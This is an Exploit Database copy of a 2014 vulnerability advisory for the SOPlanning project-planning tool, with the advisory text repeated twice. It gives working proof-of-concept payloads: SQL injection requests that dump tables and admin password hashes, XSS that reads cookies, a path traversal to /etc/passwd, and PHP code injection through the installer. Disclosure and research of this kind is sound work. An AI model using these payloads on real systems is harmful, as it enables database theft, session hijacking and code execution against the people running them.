CVEs: CVE-2014-8673, CVE-2014-8674, CVE-2014-8675, CVE-2014-8676, CVE-2014-8677

Vendor: http://www.soplanning.org/
Product: SOPlanning - Simple Online Planning
Version affected: 1.32 and prior

Product description:
SO Planning is an open source online planning tool completely free, designed to easily plan projects / tasks online, in order to manage and define work for a whole team. (from http://www.soplanning.org/en/index.php)

Advisory introduction:
Soplanning version 1.32 is susceptible to multiple vulnerabilities, including SQLi, XSS, path traversal, authentication information disclosure, PHP code injection.

Credit: Huy-Ngoc DAU of Deloitte Conseil, France

================================
Finding 1: Soplanning multiple SQL injection vulnerabilities (CVE-2014-8673)
================================
- SQLi in planning.php
The project, user, task filters are prone to SQLi due to lack of user input sanitization.

POC :
POST /process/planning.php HTTP/1.1
Host: localhost
Connection: keep-alive
Content-Length: 141
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: http://localhost/planning.php
Accept-Encoding: gzip,deflate,sdch
Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4,vi;q=0.2
Cookie: soplanning=[VALID SESSION COOKIE]; inverserUsersProjets=1

filtreGroupeProjet=1&projet_anything=anything') union all select 111,table_name,333,444,555,666,777,888,999 from information_schema.tables#

The query's results can be retrieved by accessing http://localhost/export_csv.php

- order by statement blind SQLi in user_list.php, projets.php, user_groupes.php, groupe_list.php
POC:
http://localhost/user_list.php?page=1&order=1,1&by=
http://localhost/projets.php?order=1,0&by=
http://localhost/user_groupes.php?page=1&order=1,(select%20case%20when%20(1=1)%20then%201%20else%201*(select%201%20from%20information_schema.tables)end)=1&by=
http://localhost/groupe_list.php?page=1&order=1,(select%20case%20when%20(1=0)%20then%201%20else%201*(select%201%20from%20information_schema.tables)end)=1&by=

- triPlanning GET parameter Blind SQLi in process/planning.php
POC:
http://localhost/process/planning.php?triPlanning=1,1
and
http://localhost/process/planning.php?triPlanning=1,0
(don't follow redirection back to ../planning.php where the sanitization is done)

The differences of TRUE and FALSE can be observed by accessing http://localhost/export_pdf.php?debug=1

- SQLi in LIMIT statement in nb_lignes cookie
POC: set the following cookie :
nb_lignes=20 into outfile '/tmp/poc_soplanning.txt'
and visit http://localhost/process/planning.php

Sample file output content:
ADM      \N          admin    admin    df5b909019c9b1659e86e0d6bf8da81d6fa3499e   \N          oui               000000  ["users_manage_all", "projects_manage_all", "projectgroups_manage_all", "tasks_modify_all", "tasks_view_all_projects", "parameters_all"]  [md5]    non        \N

- insecure use of addslashes function to protect against SQLi
Soplanning sanitizes user input to protect against SQLi by using PHP addslashes() function. However, this function is known to be unsafe. Instead, mysql_real_escape_string() should be used.

================================
Finding 2: Soplanning multiple XSS vulnerabilities (CVE-2014-8674)
================================
- XSS via cookie manipulation in unauthenticated mode (nb_mois, nb_lignes)
This vulnerable allows for an attacker having physical access to a user's browser even in unauthenticated mode to steal the user's authenticated cookie.

POC:
Disconnect active user session
At authentication page, set the following cookie: nb_mois="><script>alert(document.cookie)</script><"
Login with any valid user account, an alert message will show the cookies.

- Stored XSS in calender export functions
Export functions offer a "debug" mode which outputs HTML instead of formatted content (pdf, ical). This mode can be activated by setting the "debug" GET parameter. However, by injecting malicious HTML code into a project name for example, it is possible to conduct XSS attacks.

POC:
Create a new project with the name <script>alert(1);</script>
Access http://localhost/export_pdf.php?debug=1

================================
Finding 3: Soplanning authentication hash disclosure via GET URL in ICAL calender sharing function (CVE-2014-8675)
================================
Soplanning allows for an ICAL calendar to be shared/used elsewhere. However, the link is generated statically using authentication information.

Sample generated link:
http://localhost/export_ical.php?login=admin&hash=61b9bab17cdab06e759f2d11ee11afab

An offline brute force attack can thus be conducted to find the user's password: hash = md5($user->login . '¤¤' . $user->password);

================================
Finding 4: Soplanning path traversal in Holidays calender import function (CVE-2014-8676)
================================
If error messages are activated, the vulnerability allows to detect existence of a remote arbitrary file.

POC:
http://localhost/process/feries.php?fichier=../../../../../../../etc/passwd

Sample error output when file does not exist:
Warning: file_get_contents(../../holidays/../../etc/passwd) [function.file-get-contents]: failed to open stream: No such file or directory in /[PATH]/includes/class_vcalendar.inc on line 1665

However, it is not possible to retrieve file content or conduct further attack using this vulnerability.

================================
Finding 5: Soplanning PHP code injection in installation process (CVE-2014-8677)
================================
The installation process is prone to PHP code execution vulnerability.

POC:
 - Go to http://localhost/install
- Enter valid database credentials and host information. The database name is as follows :
 so';phpinfo();//
- The next page will show the phpinfo() results

It should be noted that in order for the attack to work, the attacker must prepare his own database server and the database user must either have access to a real database named "so';phpinfo();//", or have privileges to create any database.

For installed instances of Soplanning, the attack is also possible (i.e. the installing interface is accessible) if:
- PHP version is older than 5.2
- Configured database server is (temporarily or not) down
- The directory smarty/templates_c is not writable

================================

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

================================
Finding 1: Soplanning multiple SQL injection vulnerabilities (CVE-2014-8673)
================================
- SQLi in planning.php
The project, user, task filters are prone to SQLi due to lack of user input sanitization.

POC :
POST /process/planning.php HTTP/1.1
Host: localhost
Connection: keep-alive
Content-Length: 141
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125
Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: <http://localhost/planning.php>
Accept-Encoding: gzip,deflate,sdch
Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4,vi;q=0.2
Cookie: soplanning=[VALID SESSION COOKIE]; inverserUsersProjets=1

filtreGroupeProjet=1&projet_anything=anything') union all select 111,table_name,333,444,555,666,777,888,999 from
information_schema.tables#

The query's results can be retrieved by accessing <http://localhost/export_csv.php>

- order by statement blind SQLi in user_list.php, projets.php, user_groupes.php, groupe_list.php
POC:
<http://localhost/user_list.php?page=1&order=1,1&by=>
<http://localhost/projets.php?order=1,0&by=>
<http://localhost/user_groupes.php?page=1&order=1>,(select%20case%20when%20(1=1)%20then%201%20else%201*(select%201%20from%20information_schema.tables)end)=1&by=
<http://localhost/groupe_list.php?page=1&order=1>,(select%20case%20when%20(1=0)%20then%201%20else%201*(select%201%20from%20information_schema.tables)end)=1&by=

- triPlanning GET parameter Blind SQLi in process/planning.php
POC:
<http://localhost/process/planning.php?triPlanning=1,1>
and
<http://localhost/process/planning.php?triPlanning=1,0>
(don't follow redirection back to ../planning.php where the sanitization is done)

The differences of TRUE and FALSE can be observed by accessing <http://localhost/export_pdf.php?debug=1>

- SQLi in LIMIT statement in nb_lignes cookie
POC: set the following cookie :
nb_lignes=20 into outfile '/tmp/poc_soplanning.txt'
and visit <http://localhost/process/planning.php>

Sample file output content:
ADM      \N          admin    admin    df5b909019c9b1659e86e0d6bf8da81d6fa3499e   \N          oui               000000
["users_manage_all", "projects_manage_all", "projectgroups_manage_all", "tasks_modify_all", "tasks_view_all_projects",
"parameters_all"]  [md5]    non        \N

- insecure use of addslashes function to protect against SQLi
Soplanning sanitizes user input to protect against SQLi by using PHP addslashes() function. However, this function is
known to be unsafe. Instead, mysql_real_escape_string() should be used.

================================
Finding 2: Soplanning multiple XSS vulnerabilities (CVE-2014-8674)
================================
- XSS via cookie manipulation in unauthenticated mode (nb_mois, nb_lignes)
This vulnerable allows for an attacker having physical access to a user's browser even in unauthenticated mode to steal
the user's authenticated cookie.

POC:
Disconnect active user session
At authentication page, set the following cookie: nb_mois="><script>alert(document.cookie)</script><"
Login with any valid user account, an alert message will show the cookies.

- Stored XSS in calender export functions
Export functions offer a "debug" mode which outputs HTML instead of formatted content (pdf, ical). This mode can be
activated by setting the "debug" GET parameter. However, by injecting malicious HTML code into a project name for
example, it is possible to conduct XSS attacks.

POC:
Create a new project with the name <script>alert(1);</script>
Access <http://localhost/export_pdf.php?debug=1>

================================
Finding 3: Soplanning authentication hash disclosure via GET URL in ICAL calender sharing function (CVE-2014-8675)
================================
Soplanning allows for an ICAL calendar to be shared/used elsewhere. However, the link is generated statically using
authentication information.

Sample generated link:
<http://localhost/export_ical.php?login=admin&hash=61b9bab17cdab06e759f2d11ee11afab>

An offline brute force attack can thus be conducted to find the user's password: hash = md5($user->login . '¤¤' .
$user->password);

================================
Finding 4: Soplanning path traversal in Holidays calender import function (CVE-2014-8676)
================================
If error messages are activated, the vulnerability allows to detect existence of a remote arbitrary file.

POC:
<http://localhost/process/feries.php?fichier=../../../../../../../etc/passwd>

Sample error output when file does not exist:
Warning: file_get_contents(../../holidays/../../etc/passwd) [function.file-get-contents]: failed to open stream: No
such file or directory in /[PATH]/includes/class_vcalendar.inc on line 1665

However, it is not possible to retrieve file content or conduct further attack using this vulnerability.

================================
Finding 5: Soplanning PHP code injection in installation process (CVE-2014-8677)
================================
The installation process is prone to PHP code execution vulnerability.

POC:
 - Go to <http://localhost/install>
- Enter valid database credentials and host information. The database name is as follows :
 so';phpinfo();//
- The next page will show the phpinfo() results

It should be noted that in order for the attack to work, the attacker must prepare his own database server and the
database user must either have access to a real database named "so';phpinfo();//", or have privileges to create any
database.

For installed instances of Soplanning, the attack is also possible (i.e. the installing interface is accessible) if:
- PHP version is older than 5.2
- Configured database server is (temporarily or not) down
- The directory smarty/templates_c is not writable

================================
